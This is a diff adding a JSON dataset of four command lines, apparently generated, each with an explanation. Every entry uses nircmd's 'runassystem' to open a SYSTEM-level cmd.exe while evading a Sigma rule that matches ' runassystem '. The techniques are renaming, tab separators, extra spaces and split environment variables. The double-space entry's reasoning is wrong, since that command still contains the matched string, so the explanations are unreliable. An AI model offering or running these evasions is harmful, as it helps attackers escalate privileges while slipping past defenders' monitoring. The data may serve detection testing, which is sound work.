@@ -1,0 +1,18 @@
+[
+  {
+    "output": "copy nircmd.exe n.exe && n.exe \"runassystem\" \"cmd.exe\"",
+    "explanation": "The Sigma rule specifically looks for the string ' runassystem ' (with spaces) in the command line. By renaming the executable to something inconspicuous and ensuring the arguments are formatted or quoted in a way that breaks simple string matching or relies on the parser's flexibility, the intent remains the same while evading a literal string match."
+  },
+  {
+    "output": "nircmd.exe\trunassystem\tcmd.exe",
+    "explanation": "The detection logic searches for ' runassystem ' (surrounded by spaces). By using a horizontal tab character (HT / \\t) instead of a space between the command and the argument, the functionality is preserved on the Windows command line, but the literal string match defined in the Sigma rule fails."
+  },
+  {
+    "output": "nircmd.exe  runassystem  \"C:\\Windows\\System32\\cmd.exe\"",
+    "explanation": "If the detection engine is strictly looking for a single space ' runassystem ', using double spaces or unconventional quoting can sometimes evade simple 'contains' logic depending on how the SIEM normalizes whitespace."
+  },
+  {
+    "output": "set a=run&& set b=assystem&& nircmd.exe %a%%b% cmd.exe",
+    "explanation": "By using environment variable expansion within a batch script or command block, the string 'runassystem' never appears in the initial process creation command line as a single contiguous string, effectively bypassing static string-based detection."
+  }
+]
